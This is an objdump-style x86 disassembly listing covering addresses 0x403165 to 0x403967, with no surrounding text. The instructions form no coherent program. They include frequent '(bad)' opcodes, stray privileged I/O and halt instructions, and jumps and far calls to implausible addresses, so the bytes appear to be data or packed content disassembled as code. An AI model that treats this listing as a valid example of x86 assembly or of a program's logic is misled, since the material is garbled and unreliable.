  403165:	mov    al,0x8f
  403167:	jmp    0x6b2d15a2
  40316c:	bound  ebp,QWORD PTR [edi+eax*1+0x6bea306c]
  403173:	pop    edi
  403174:	sbb    eax,0xffffffb1
  403177:	je     0x40310b
  403179:	push   edi
  40317a:	pop    ds
  40317b:	push   esi
  40317c:	shr    DWORD PTR [eax+0x5c769f9e],0x1a
  403183:	adc    al,0x4
  403185:	jp     0x403156
  403187:	mov    ah,0xea
  403189:	ffree  st(7)
  40318b:	gs imul ebp,esi,0x32
  40318f:	lea    ebp,[esi]
  403191:	test   eax,0xc9b2674b
  403196:	dec    esi
  403197:	(bad)  
  403199:	mov    ah,0xdb
  40319b:	(bad)  
  40319c:	in     al,0xc3
  40319e:	shr    DWORD PTR [esi],1
  4031a0:	xchg   ebx,eax
  4031a1:	scas   al,BYTE PTR es:[edi]
  4031a2:	js     0x40321b
  4031a4:	xchg   BYTE PTR [eax-0x25],bl
  4031a7:	jmp    0x810f387f
  4031ac:	add    al,BYTE PTR [edx]
  4031ae:	mov    cl,0x5d
  4031b0:	outs   dx,DWORD PTR ds:[esi]
  4031b1:	(bad)  [esi-0x26]
  4031b4:	ins    DWORD PTR es:[edi],dx
  4031b5:	or     ch,BYTE PTR [edx]
  4031b7:	(bad)  
  4031b8:	in     eax,dx
  4031b9:	ss mov cl,0x2c
  4031bc:	jne    0x4031b6
  4031be:	or     al,0xc3
  4031c0:	mov    esp,0x9cd5dffa
  4031c5:	loope  0x4031b8
  4031c7:	jne    0x4031db
  4031c9:	js     0x4031f0
  4031cb:	mov    ecx,DWORD PTR [ecx+0x19]
  4031ce:	ret    
  4031cf:	int    0x17
  4031d1:	scas   eax,DWORD PTR es:[edi]
  4031d2:	mov    eax,ds:0xe87ed631
  4031d7:	jge    0x4031d4
  4031d9:	clc    
  4031da:	stc    
  4031db:	pop    ss
  4031dc:	jae    0x4031cf
  4031de:	aaa    
  4031df:	test   eax,0x8a919c32
  4031e4:	call   0x51b30f82
  4031e9:	in     al,0x41
  4031eb:	jne    0x403176
  4031ed:	pop    esp
  4031ee:	outs   dx,BYTE PTR ds:[esi]
  4031ef:	cmc    
  4031f0:	adc    BYTE PTR [esi],0x8b
  4031f3:	and    bh,BYTE PTR [ebx+0x60a45829]
  4031f9:	aaa    
  4031fa:	jle    0x4031f2
  4031fc:	sbb    BYTE PTR [edi+ebx*2-0x2c],bh
  403200:	outs   dx,DWORD PTR ds:[esi]
  403201:	imul   ecx,DWORD PTR [edx-0x3093cc90],0x905887d1
  40320b:	scas   eax,DWORD PTR es:[edi]
  40320c:	test   DWORD PTR [ecx+0x36b79bb0],edi
  403212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403213:	inc    esi
  403214:	sub    eax,0xccb8dad7
  403219:	rcr    BYTE PTR [esi+0xa670d91],0x80
  403220:	ja     0x4031c0
  403222:	jecxz  0x4031f3
  403224:	xchg   DWORD PTR [edx+esi*8],ecx
  403227:	outs   dx,DWORD PTR ds:[esi]
  403228:	lea    esi,[ebp-0x72]
  40322b:	sub    dl,BYTE PTR [ebx]
  40322d:	fisubr WORD PTR [ebx-0x68dfce79]
  403233:	hlt    
  403234:	pop    eax
  403235:	out    dx,al
  403236:	push   ecx
  403237:	cmp    BYTE PTR [ebx+ecx*1+0x519fb05a],0x52
  40323f:	into   
  403240:	mov    dh,0xa9
  403242:	js     0x4031cd
  403244:	sti    
  403245:	inc    eax
  403246:	aam    0xda
  403248:	sbb    BYTE PTR [ebp-0x17fd777f],dl
  40324e:	jp     0x40328d
  403250:	call   0x865:0xb7f6cc95
  403257:	cmp    ch,0x33
  40325a:	sar    dl,1
  40325c:	outs   dx,BYTE PTR ds:[esi]
  40325d:	faddp  st(3),st
  40325f:	jne    0x403268
  403261:	mov    BYTE PTR [eax+0x78be4d53],ch
  403267:	mov    eax,0x223fe7a8
  40326c:	sbb    ebp,DWORD PTR [ecx]
  40326e:	cmp    eax,0x357b319d
  403273:	jmp    0x19a9b501
  403278:	cmp    al,0xd
  40327a:	sti    
  40327b:	es daa 
  40327d:	sbb    BYTE PTR [esi-0x37e62a53],bh
  403283:	xor    al,0x45
  403285:	sub    dh,BYTE PTR [ecx-0xd]
  403288:	or     edx,DWORD PTR [esi+0x394658f2]
  40328e:	adc    edi,eax
  403290:	ss ins DWORD PTR es:[edi],dx
  403292:	in     al,0x14
  403294:	lock sbb eax,0x536b1d4c
  40329a:	and    eax,0xe71be74a
  40329f:	pusha  
  4032a0:	xor    eax,0x234d7df8
  4032a5:	and    al,0xf0
  4032a7:	sub    al,0x4b
  4032a9:	jne    0x403320
  4032ab:	imul   ebp,DWORD PTR [eax],0xffffffac
  4032ae:	push   eax
  4032af:	mov    WORD PTR [ebp+0x75f7d453],ds
  4032b5:	cmp    al,0x7
  4032b7:	mov    ah,0x3a
  4032b9:	in     eax,0x22
  4032bb:	lods   eax,DWORD PTR ds:[esi]
  4032bc:	sbb    eax,0x1430dc78
  4032c1:	xor    DWORD PTR [ecx],edx
  4032c3:	inc    ebx
  4032c4:	mov    esp,0x2787b5b3
  4032c9:	test   eax,0xe6304595
  4032ce:	div    esp
  4032d0:	(bad)  
  4032d1:	int3   
  4032d2:	loop   0x40333d
  4032d4:	sar    DWORD PTR [eax+eax*4-0xf801873],cl
  4032db:	or     edx,ebx
  4032dd:	(bad)  
  4032de:	dec    eax
  4032df:	mov    edi,DWORD PTR [edi-0x50]
  4032e2:	add    ah,BYTE PTR [edx-0x7a241f57]
  4032e8:	cmp    ebx,edx
  4032ea:	and    BYTE PTR [ecx-0x43eada79],al
  4032f0:	mov    eax,ds:0x59a1888
  4032f5:	cmp    eax,0xc73936b0
  4032fa:	mov    ebx,0x77bf5cd4
  4032ff:	fs jl  0x403334
  403302:	nop    ecx
  403305:	xchg   esi,eax
  403306:	popf   
  403307:	mov    ebp,0xde316ea
  40330c:	jg     0x40330b
  40330e:	xchg   edx,eax
  40330f:	cmp    al,0x24
  403311:	fs pop eax
  403313:	xchg   BYTE PTR [ecx+0x286f4a9d],bh
  403319:	jge    0x4032e3
  40331b:	cmp    BYTE PTR [edi+0x606e4b9f],al
  403321:	add    al,0x8e
  403323:	push   0xc000744b
  403328:	bound  eax,QWORD PTR ss:[ecx+0x34ab464b]
  40332f:	sub    BYTE PTR [ebx],bh
  403331:	into   
  403332:	inc    esi
  403333:	enter  0x20fe,0x5b
  403337:	mov    ecx,0xd3a04cd3
  40333c:	test   eax,0x95443d2a
  403341:	scas   eax,DWORD PTR es:[edi]
  403342:	scas   al,BYTE PTR es:[edi]
  403343:	(bad)  [esi]
  403345:	test   eax,0xf85754e2
  40334a:	adc    DWORD PTR [ebx-0x6ba069b2],edi
  403350:	xor    BYTE PTR [esi-0x211f5a57],ch
  403356:	xchg   edi,eax
  403357:	rol    DWORD PTR [ebp+0x23],1
  40335a:	leave  
  40335b:	jg     0x40335e
  40335d:	push   ebx
  40335e:	leave  
  40335f:	or     BYTE PTR [esi+eax*4],ah
  403362:	(bad)  
  403364:	mov    ecx,0x42cc44f1
  403369:	pop    ebx
  40336a:	and    al,0x6d
  40336c:	mov    ds:0xe6ca336c,al
  403371:	push   esp
  403372:	xor    ecx,DWORD PTR [ecx+0x6ba37c2d]
  403378:	and    BYTE PTR ds:0x39307c31,ch
  40337e:	mov    ecx,0x41f8a9e9
  403383:	xchg   dh,dh
  403385:	out    dx,al
  403386:	inc    esi
  403387:	test   al,0xe1
  403389:	out    0xe3,eax
  40338b:	inc    ecx
  40338c:	int    0x2c
  40338e:	dec    esp
  40338f:	xor    DWORD PTR [esi-0x3fbfa60a],esp
  403395:	cwde   
  403396:	loope  0x403364
  403398:	cs cs pop ecx
  40339b:	enter  0xea0e,0x30
  40339f:	out    0x97,eax
  4033a1:	sbb    BYTE PTR [edi-0x61],ch
  4033a4:	shr    BYTE PTR [edi-0x3d],cl
  4033a7:	retf   
  4033a8:	(bad)  
  4033a9:	or     ecx,DWORD PTR [eax-0x5a758eda]
  4033af:	les    esp,FWORD PTR cs:[eax]
  4033b2:	and    eax,DWORD PTR [ebp+0x235a7d6f]
  4033b8:	push   esp
  4033b9:	stos   BYTE PTR es:[edi],al
  4033ba:	fcomp  DWORD PTR [edx+0x55]
  4033bd:	mov    eax,0xe903b355
  4033c2:	cmp    eax,0xffffff96
  4033c5:	jne    0x4033ba
  4033c7:	cmp    al,BYTE PTR [edx]
  4033c9:	mov    ecx,0xfe0c5846
  4033ce:	dec    ebx
  4033cf:	aaa    
  4033d0:	dec    ecx
  4033d1:	imul   ecx,DWORD PTR [ecx-0x71],0x44
  4033d5:	stos   DWORD PTR es:[edi],eax
  4033d6:	jmp    0xded9ae8c
  4033db:	mov    WORD PTR [ecx],ss
  4033dd:	fs add edx,0xcb6fc201
  4033e4:	xchg   edx,eax
  4033e5:	retf   0x797a
  4033e8:	mov    ebx,DWORD PTR [edi]
  4033ea:	sub    bl,dh
  4033ec:	sub    edx,0x1205139c
  4033f2:	inc    esp
  4033f3:	mov    eax,0x2ffa17b0
  4033f8:	outs   dx,BYTE PTR ds:[esi]
  4033f9:	out    dx,al
  4033fa:	adc    eax,0x651ea363
  4033ff:	xor    BYTE PTR [eax-0x67b86006],dl
  403405:	(bad)  
  403406:	pushw  ds
  403408:	(bad)
  40340b:	pop    ecx
  40340c:	addr16 jge 0x40347b
  40340f:	pop    esp
  403410:	pop    ss
  403411:	scas   al,BYTE PTR es:[edi]
  403412:	inc    esp
  403413:	(bad)  
  403414:	xchg   esi,eax
  403415:	test   ah,0xf8
  403418:	push   0x6c
  40341a:	fmul   DWORD PTR [ebp+0xf49eab4]
  403420:	ret    0x3471
  403423:	in     eax,dx
  403424:	popf   
  403425:	pop    esp
  403426:	jns    0x4033be
  403428:	and    BYTE PTR [edx],ch
  40342a:	or     BYTE PTR [ebx+0x16],bl
  40342d:	loopne 0x40348b
  40342f:	dec    edi
  403430:	sbb    eax,0xd33a44e5
  403435:	scas   al,BYTE PTR es:[edi]
  403436:	or     ebp,ebp
  403438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403439:	adc    al,0x2f
  40343b:	jnp    0x4033cb
  40343d:	xor    DWORD PTR [esi],ebp
  40343f:	frstor [eax+0x63]
  403442:	rol    ecx,0xbd
  403445:	mov    cx,0xee6a
  403449:	cmp    ah,BYTE PTR [edx+ebx*2+0x7e]
  40344d:	add    al,0xff
  40344f:	sti    
  403450:	or     BYTE PTR [edi],al
  403452:	repz test ebp,ebp
  403455:	jle    0x403461
  403457:	scas   al,BYTE PTR es:[edi]
  403458:	mov    edi,DWORD PTR [esi+0x36]
  40345b:	pusha  
  40345c:	mov    ebp,0x74c8fa50
  403461:	ret    
  403462:	push   edx
  403463:	inc    esi
  403464:	push   es
  403465:	cmp    ebx,DWORD PTR [ebx+0x5c3e6ced]
  40346b:	xor    ah,cl
  40346d:	jo     0x403415
  40346f:	adc    BYTE PTR [edi+0x30e41e7a],bl
  403475:	enter  0x2353,0xf6
  403479:	(bad)  
  40347a:	pop    ecx
  40347b:	pop    ds
  40347c:	cwde   
  40347d:	jp     0x40347b
  40347f:	push   edx
  403480:	mov    edi,0x954dc7dd
  403485:	sub    edi,DWORD PTR [esi*2+0x593c2b26]
  40348c:	popf   
  40348d:	cmp    DWORD PTR [edi+0x13],eax
  403490:	sar    DWORD PTR [ebx-0x11],0x61
  403494:	test   eax,0xabae9deb
  403499:	ss jl  0x4034b6
  40349c:	dec    ebx
  40349d:	and    DWORD PTR [ebp+0x4a],esp
  4034a0:	test   al,0xe5
  4034a2:	ins    BYTE PTR es:[edi],dx
  4034a3:	sub    eax,DWORD PTR [edi+edx*8]
  4034a6:	push   0x37
  4034a8:	mov    ch,0xf
  4034aa:	mov    ah,0x8e
  4034ac:	xchg   DWORD PTR [edi+0x2a],edi
  4034af:	leave  
  4034b0:	(bad)  
  4034b1:	xchg   edx,eax
  4034b2:	jb     0x40345f
  4034b4:	pop    eax
  4034b5:	jne    0x403465
  4034b7:	inc    esp
  4034b8:	add    al,0x90
  4034ba:	daa    
  4034bb:	enter  0xfe0c,0x6d
  4034bf:	pop    ebp
  4034c0:	dec    edx
  4034c1:	std    
  4034c2:	gs pop ss
  4034c4:	inc    esi
  4034c5:	jp     0x40352e
  4034c7:	or     al,0x3e
  4034c9:	cmp    BYTE PTR [ebx-0x599d1320],0x74
  4034d0:	lods   eax,DWORD PTR ds:[esi]
  4034d1:	dec    edi
  4034d2:	ins    DWORD PTR es:[edi],dx
  4034d3:	test   BYTE PTR [edx+eiz*2],cl
  4034d6:	rcl    cl,1
  4034d8:	add    al,0xf6
  4034da:	sub    al,0x99
  4034dc:	mov    ah,BYTE PTR [ecx]
  4034de:	dec    ebp
  4034df:	call   0x7384:0x6cc9d0a2
  4034e6:	shr    ebx,cl
  4034e8:	pusha  
  4034e9:	jecxz  0x403523
  4034eb:	xchg   esp,eax
  4034ec:	(bad)  
  4034ed:	inc    edi
  4034ee:	jo     0x4034d0
  4034f0:	jmp    0x403488
  4034f2:	mov    edi,0xea5fc4c3
  4034f7:	adc    ebx,edx
  4034f9:	sub    dl,BYTE PTR [ecx+0x1bb34fc8]
  4034ff:	dec    ebx
  403500:	scas   al,BYTE PTR es:[edi]
  403501:	lods   eax,DWORD PTR ds:[esi]
  403502:	fidiv  DWORD PTR [ebp-0x1f]
  403505:	ror    al,cl
  403507:	mov    eax,0xfba6c29a
  40350c:	and    eax,0xd508bd98
  403511:	call   0xf970893
  403516:	loopne 0x403539
  403518:	in     al,0x6d
  40351a:	cwde   
  40351b:	jbe    0x4034a6
  40351d:	xchg   esi,eax
  40351e:	loop   0x40354f
  403520:	gs inc ebx
  403522:	or     ch,BYTE PTR [edi]
  403524:	inc    esi
  403525:	das    
  403526:	mov    bl,ah
  403528:	scas   eax,DWORD PTR es:[edi]
  403529:	neg    dh
  40352b:	ret    
  40352c:	jae    0x403587
  40352e:	xor    ebx,DWORD PTR [ecx]
  403530:	and    al,0x33
  403532:	mov    ecx,0x40372669
  403537:	xchg   ebp,eax
  403538:	pop    eax
  403539:	aad    0xf6
  40353b:	int3   
  40353c:	repnz nop
  40353e:	test   BYTE PTR [edx],cl
  403540:	xchg   BYTE PTR [ebp+0x4c1b0ab7],bh
  403546:	or     edx,DWORD PTR [ecx+0x43732239]
  40354c:	sub    BYTE PTR [esi+esi*1+0x61a5b60c],ah
  403553:	int    0xad
  403555:	dec    esi
  403556:	dec    eax
  403557:	xchg   esi,eax
  403558:	and    BYTE PTR [edx],bh
  40355a:	bound  edx,QWORD PTR [ecx+0x29f4034a]
  403560:	jb     0xc683de65
  403566:	into   
  403567:	ins    DWORD PTR es:[edi],dx
  403568:	push   cs
  403569:	cmp    eax,0x407881ae
  40356e:	cmovbe edi,DWORD PTR [edi-0x48]
  403572:	xchg   DWORD PTR [esi-0x61],ecx
  403575:	pop    edi
  403576:	xchg   ebx,eax
  403577:	lods   al,BYTE PTR ds:[esi]
  403578:	mov    ebx,DWORD PTR [eax]
  40357a:	jnp    0x4035c1
  40357c:	or     ecx,DWORD PTR [edx]
  40357e:	in     al,dx
  40357f:	inc    edx
  403580:	xor    DWORD PTR [ecx+edx*1],0x6e
  403584:	cwde   
  403585:	sub    cl,BYTE PTR [edi]
  403587:	lahf   
  403588:	(bad)  
  403589:	out    0x9e,eax
  40358b:	fistp  DWORD PTR [edx]
  40358d:	ror    BYTE PTR [ecx],0xcf
  403590:	or     ebx,DWORD PTR [edi-0x50]
  403593:	test   al,al
  403595:	les    esi,FWORD PTR [ecx+0x1bc3b543]
  40359b:	sub    cl,bl
  40359d:	mov    edx,0xae35f0c2
  4035a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035a3:	es std 
  4035a5:	mov    ebp,0x1133fc8
  4035aa:	mov    edx,DWORD PTR [eax+edx*8]
  4035ad:	(bad)  
  4035ae:	inc    edi
  4035af:	adc    cl,BYTE PTR [ebx-0x77]
  4035b2:	mov    ch,0x97
  4035b4:	dec    ecx
  4035b5:	fcmove st,st(1)
  4035b7:	push   ebx
  4035b8:	loop   0x4035c8
  4035ba:	sbb    al,0x42
  4035bc:	mov    eax,ebp
  4035be:	sub    eax,0x4a74b8e9
  4035c3:	(bad)  
  4035c4:	sbb    BYTE PTR [edi],al
  4035c6:	das    
  4035c7:	ret    0x792b
  4035ca:	aaa    
  4035cb:	aaa    
  4035cc:	xchg   esi,eax
  4035cd:	adc    DWORD PTR [ebx-0x3fd0254e],ecx
  4035d3:	mov    DWORD PTR [ebp+0x6aee97cd],ebp
  4035d9:	addr16 add eax,0x75552cb3
  4035df:	test   DWORD PTR [ebp+0x2f],ecx
  4035e2:	xor    dh,BYTE PTR [eax-0x7a]
  4035e5:	mov    WORD PTR [edi],gs
  4035e7:	ficomp DWORD PTR [eax+0x4a]
  4035ea:	push   ss
  4035eb:	test   eax,0xdbc013a7
  4035f0:	mov    BYTE PTR [esp+edx*8],dh
  4035f3:	call   0xa076:0xe52c2e7f
  4035fa:	xrelease xchg DWORD PTR [esi-0x35],eax
  4035fe:	ss ja  0x4035c7
  403601:	retf   0xf0ae
  403604:	ss add edi,edi
  403607:	xor    eax,0x22ad6a6e
  40360c:	in     al,0x34
  40360e:	jae    0x4035da
  403610:	rol    BYTE PTR [ebp+0x7760c7],cl
  403616:	mov    esp,0xd32d512d
  40361b:	sahf   
  40361c:	fsubp  st(3),st
  40361e:	pop    ebx
  40361f:	xchg   ah,al
  403621:	jns    0x403684
  403623:	add    BYTE PTR [eax+0x733829d9],0xea
  40362a:	sbb    DWORD PTR [ebp+0x3ca9ba58],esi
  403630:	stc    
  403631:	mov    bl,0xdc
  403633:	pushf  
  403634:	ret    0x3789
  403637:	mov    dl,0xd4
  403639:	mov    dh,0x7f
  40363b:	cmp    DWORD PTR [esi+edx*2-0x35],0x71
  403640:	fdivr  st(3),st
  403642:	inc    esi
  403643:	jns    0x4036a1
  403645:	lock mov ecx,0xb07ac7fc
  40364b:	lds    edi,FWORD PTR [edx]
  40364d:	add    DWORD PTR [edi],eax
  40364f:	cs and eax,0x6a8cc7b3
  403655:	ins    BYTE PTR es:[edi],dx
  403656:	pop    eax
  403657:	sub    cl,BYTE PTR [ebx+0x59]
  40365a:	nop
  40365b:	(bad)  
  40365c:	mov    al,0xbb
  40365e:	inc    ebp
  40365f:	sub    BYTE PTR ds:[ecx],bh
  403662:	push   edx
  403663:	adc    dl,BYTE PTR [ebp+0x2b]
  403666:	enter  0x5334,0x41
  40366a:	sbb    BYTE PTR [ebx-0x78],al
  40366d:	loopne 0x4036e0
  40366f:	adc    BYTE PTR [eax+ebx*2],cl
  403672:	mov    edi,0xb8e0d5c7
  403677:	in     eax,dx
  403678:	mov    ch,0x88
  40367a:	adc    BYTE PTR [edi+0x182ff1b9],cl
  403680:	fsubr  DWORD PTR [ecx]
  403682:	sub    al,0x34
  403684:	mov    edx,esp
  403686:	icebp  
  403687:	mov    DWORD PTR [eax-0x58398019],esp
  40368d:	mov    eax,ds:0xf1f1a5e6
  403692:	xor    BYTE PTR fs:[esi+edx*1-0x4ce162d9],0x23
  40369b:	fisubr WORD PTR [ebp+0x66342d97]
  4036a1:	mov    ebp,0xfbe030f7
  4036a6:	out    0x2e,al
  4036a8:	or     eax,0x862e6ffe
  4036ad:	cs loop 0x4036b6
  4036b0:	push   0x71
  4036b2:	push   eax
  4036b3:	test   al,0x6b
  4036b5:	cmp    BYTE PTR [eax],ch
  4036b7:	or     BYTE PTR [eax],cl
  4036b9:	sub    eax,0x9f470d2b
  4036be:	mov    ah,0x12
  4036c0:	xchg   ebx,eax
  4036c1:	pusha  
  4036c2:	xchg   ebp,eax
  4036c3:	cld    
  4036c4:	out    dx,al
  4036c5:	ret    
  4036c6:	jns    0x4036a1
  4036c8:	retf   0x8fde
  4036cb:	or     cl,BYTE PTR [eax+0x3b]
  4036ce:	cmp    dl,BYTE PTR [edx-0x14]
  4036d1:	xor    edi,ebp
  4036d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036d4:	inc    ecx
  4036d5:	adc    al,BYTE PTR [esi*1-0x2101bcaf]
  4036dc:	fisttp QWORD PTR [ecx+0xde2e615]
  4036e2:	mov    al,0x0
  4036e4:	hlt    
  4036e5:	sti    
  4036e6:	mov    esp,0x5d6cc0c7
  4036eb:	pop    esi
  4036ec:	lahf   
  4036ed:	(bad)  
  4036ee:	cmp    eax,0x9ce01030
  4036f3:	pop    edx
  4036f4:	mov    edi,0xc5303ef5
  4036f9:	pushf  
  4036fa:	add    al,0x3e
  4036fc:	loop   0x40373a
  4036fe:	sbb    al,0xd9
  403700:	out    0x95,al
  403702:	mov    eax,0x79d17a0a
  403707:	mov    cl,0x28
  403709:	and    BYTE PTR [ebp+0x1337943a],0x5e
  403710:	outs   dx,DWORD PTR ds:[esi]
  403711:	push   0x8fcaec2f
  403716:	inc    esp
  403717:	dec    ebp
  403718:	mov    bh,0xb6
  40371a:	mov    esp,0xc8461c8c
  40371f:	into   
  403720:	(bad)  
  403721:	rcr    BYTE PTR [ebp+0x4c],1
  403724:	aas    
  403725:	scas   al,BYTE PTR es:[edi]
  403726:	imul   esi,DWORD PTR [ebp+0x22388428],0x2
  40372d:	xor    DWORD PTR [eax-0x52],eax
  403730:	loop   0x4036c4
  403732:	sub    eax,0x11e1d074
  403737:	sbb    BYTE PTR [esi],0x4
  40373a:	pop    ebx
  40373b:	shl    eax,1
  40373d:	(bad)  
  40373e:	xchg   esp,eax
  40373f:	cli    
  403740:	lahf   
  403741:	fs dec ebx
  403743:	nop
  403744:	clc    
  403745:	xor    al,0x9
  403747:	scas   eax,DWORD PTR es:[edi]
  403748:	jae    0x403767
  40374a:	inc    edi
  40374b:	or     BYTE PTR [edi-0x6a],bh
  40374e:	push   es
  40374f:	int3   
  403750:	int    0x48
  403752:	and    BYTE PTR ds:0x7dacd7a8,dh
  403758:	xchg   BYTE PTR fs:[ebp+0xb],bl
  40375c:	clc    
  40375d:	push   ds
  40375e:	daa    
  40375f:	ins    DWORD PTR es:[edi],dx
  403760:	cmp    ah,BYTE PTR [esi+0x46cdf629]
  403766:	xlat   BYTE PTR gs:[ebx]
  403768:	and    eax,0xfd92d098
  40376d:	mov    ch,0xd9
  40376f:	and    al,0xee
  403771:	lods   al,BYTE PTR ds:[esi]
  403772:	mov    al,0x96
  403774:	ins    BYTE PTR es:[edi],dx
  403775:	jno    0x40374f
  403777:	(bad)  
  403778:	xchg   DWORD PTR [eax-0x7680c633],esi
  40377e:	xchg   DWORD PTR [edi+edi*4],esp
  403781:	xor    BYTE PTR [eax],dl
  403783:	stos   BYTE PTR es:[edi],al
  403784:	sub    al,0xdb
  403786:	xor    DWORD PTR [ecx+0x3502656f],esi
  40378c:	sub    dl,BYTE PTR [eax]
  40378e:	daa    
  40378f:	retf   0xf229
  403792:	mov    dh,0xed
  403794:	or     cl,BYTE PTR es:[edi]
  403797:	fucom  st(4)
  403799:	mov    al,ds:0xc908b1b1
  40379e:	push   edx
  40379f:	nop
  4037a0:	or     ebx,DWORD PTR [edx-0x2cb149f9]
  4037a6:	out    dx,al
  4037a7:	cwde   
  4037a8:	and    BYTE PTR [ecx],dl
  4037aa:	lds    ebp,FWORD PTR [edx+ecx*4+0x14]
  4037ae:	es addr16 nop
  4037b1:	dec    BYTE PTR [edx+0x7d28e844]
  4037b7:	mov    al,0x85
  4037b9:	pop    es
  4037ba:	jge    0x403752
  4037bc:	int    0x3a
  4037be:	ins    DWORD PTR es:[edi],dx
  4037bf:	sub    ah,BYTE PTR [esp+edi*1]
  4037c2:	push   ss
  4037c3:	jg     0x4037ac
  4037c5:	add    BYTE PTR [edi-0x66],dh
  4037c8:	sub    DWORD PTR [edi],ebx
  4037ca:	je     0x40377f
  4037cc:	outs   dx,DWORD PTR ds:[esi]
  4037cd:	nop
  4037ce:	aam    0xa9
  4037d0:	in     al,dx
  4037d1:	mov    dh,0x8a
  4037d3:	mov    ds:0xf150c1e2,eax
  4037d8:	lock loope 0x4037f0
  4037db:	xchg   ecx,eax
  4037dc:	add    al,0xa3
  4037de:	(bad)  
  4037df:	mov    ebx,0xb85177ed
  4037e4:	dec    ebp
  4037e5:	mov    ah,0x94
  4037e7:	mov    ?,edx
  4037e9:	test   al,0xd9
  4037eb:	cmp    eax,0xffb112d4
  4037f0:	or     al,0x18
  4037f2:	std    
  4037f3:	jl     0x4037c8
  4037f5:	leave  
  4037f6:	adc    eax,0x6d901d67
  4037fb:	dec    eax
  4037fc:	mov    es,WORD PTR [ebx-0x27e3c9d8]
  403802:	and    ah,al
  403804:	sti    
  403805:	add    BYTE PTR [ecx+0x4a],ch
  403808:	sbb    ecx,0x2f
  40380b:	es jo  0x403825
  40380e:	inc    edi
  40380f:	retf   
  403810:	cmp    eax,0x587a96ff
  403815:	or     edi,DWORD PTR [eax+0x76]
  403818:	cs xor eax,0x1a2ba49c
  40381e:	lods   al,BYTE PTR ds:[esi]
  40381f:	dec    edi
  403820:	int    0xf8
  403822:	ret    
  403823:	pop    ecx
  403824:	pop    ss
  403825:	leave  
  403826:	mov    gs,WORD PTR [edx-0x23bfd491]
  40382c:	push   ds
  40382d:	icebp  
  40382e:	dec    edx
  40382f:	and    dh,cl
  403831:	pop    ebx
  403832:	lea    edi,[ebp+esi*1+0x726b4a46]
  403839:	es pop esi
  40383b:	add    al,0xc7
  40383d:	or     eax,0x80243ef1
  403842:	and    edx,DWORD PTR [esi]
  403844:	add    DWORD PTR [edx+0x73],ecx
  403847:	daa    
  403848:	cs aam 0xe3
  40384b:	std    
  40384c:	call   0x6ccc8085
  403851:	xchg   edi,eax
  403852:	mov    ecx,0x44489df7
  403857:	push   0x8ac83537
  40385c:	jle    0x40385d
  40385e:	int    0xc7
  403860:	dec    esp
  403861:	sub    ch,BYTE PTR [edi+0x18]
  403864:	xor    BYTE PTR [edi-0x30],dh
  403867:	shr    cl,1
  403869:	push   esi
  40386a:	cmp    BYTE PTR [ecx],dl
  40386c:	sub    al,0x3a
  40386e:	cmp    eax,0x7084c7ed
  403873:	fbstp  TBYTE PTR [ecx]
  403875:	ret    
  403876:	xchg   ecx,eax
  403877:	mov    ebp,DWORD PTR [edi]
  403879:	push   es
  40387a:	sub    ecx,DWORD PTR ds:0xcaae9a43
  403880:	fld    DWORD PTR ds:0xfbe2e46e
  403886:	mov    bh,0x17
  403888:	fmulp  st(5),st
  40388a:	fcom   QWORD PTR [edx]
  40388c:	outs   dx,BYTE PTR ds:[esi]
  40388d:	dec    eax
  40388e:	js     0x403868
  403890:	lds    edi,FWORD PTR [ecx+0x5de4c1e6]
  403896:	scas   al,BYTE PTR es:[edi]
  403897:	fnstsw WORD PTR [edx-0x776abb2c]
  40389d:	pop    ebx
  40389e:	repnz adc ebx,edi
  4038a1:	pop    esp
  4038a2:	aam    0x63
  4038a4:	mov    bl,0x3f
  4038a6:	test   BYTE PTR [ecx+0x653c0a0f],ah
  4038ac:	dec    edi
  4038ad:	(bad)  
  4038ae:	icebp  
  4038af:	add    DWORD PTR [eax+0x6e],eax
  4038b2:	shl    DWORD PTR [eax+0x35e1616c],1
  4038b8:	mov    ds,WORD PTR [esi-0x1471dfd]
  4038be:	sub    edi,DWORD PTR [edx+0x5]
  4038c1:	mov    bl,0x2b
  4038c3:	mov    DWORD PTR [esi],ebp
  4038c5:	mov    esi,ebp
  4038c7:	dec    edi
  4038c8:	popf   
  4038c9:	std    
  4038ca:	icebp  
  4038cb:	cwde   
  4038cc:	in     eax,0xeb
  4038ce:	xchg   ebp,eax
  4038cf:	imul   DWORD PTR [edx]
  4038d1:	fdivr  DWORD PTR [esi+0x5]
  4038d4:	fwait
  4038d5:	pusha  
  4038d6:	push   esi
  4038d7:	sub    eax,0xe83293ca
  4038dc:	aam    0x82
  4038de:	cld    
  4038df:	retf   
  4038e0:	popf   
  4038e1:	or     BYTE PTR [ebp-0x48a6b0f1],0x56
  4038e8:	arpl   WORD PTR [ebp-0x2c382415],bp
  4038ee:	push   ebx
  4038ef:	les    ecx,FWORD PTR [esi]
  4038f1:	pusha  
  4038f2:	add    BYTE PTR [ebx*1-0x3b9e81e9],ch
  4038f9:	xor    al,0x6e
  4038fb:	mov    ebx,0x32973903
  403900:	inc    edi
  403901:	add    cl,al
  403903:	aaa    
  403904:	js     0x403985
  403906:	xor    edx,edi
  403908:	cmp    dh,BYTE PTR [ebx]
  40390a:	outs   dx,BYTE PTR ds:[esi]
  40390b:	mov    dl,0xc9
  40390d:	ins    BYTE PTR es:[edi],dx
  40390e:	into   
  40390f:	xchg   ax,ax
  403911:	jo     0x4038eb
  403913:	(bad)  
  403914:	sub    dh,BYTE PTR [esi+0x75]
  403917:	(bad)  
  403918:	out    0xd4,al
  40391a:	xchg   ecx,eax
  40391b:	stc    
  40391c:	out    0xdf,eax
  40391e:	imul   esi,DWORD PTR [edx-0x5a928c9],0xffffffc2
  403925:	xchg   DWORD PTR [edx],ecx
  403927:	jno    0x4038ca
  403929:	push   eax
  40392a:	fst    DWORD PTR [edx-0x6fce03f]
  403930:	inc    esi
  403931:	push   ebx
  403932:	or     DWORD PTR [eax-0x56b4935d],edi
  403938:	adc    ah,BYTE PTR [edx-0x69360b2e]
  40393e:	test   ecx,0x1a2a8ab1
  403944:	inc    ecx
  403945:	aam    0x27
  403947:	jae    0x40399d
  403949:	cdq    
  40394a:	jge    0x40392e
  40394c:	mov    ebx,esp
  40394e:	stos   BYTE PTR es:[edi],al
  40394f:	mov    bl,0x9e
  403951:	(bad)  
  403952:	lock fnsave [ebx-0xf36e0d5]
  403959:	das    
  40395a:	mov    ch,0x7a
  40395c:	addr16 clc 
  40395e:	call   0xcc91:0xb4c66355
  403965:	pop    ebx
  403966:	ret    
  403967:	mov    dh,ch
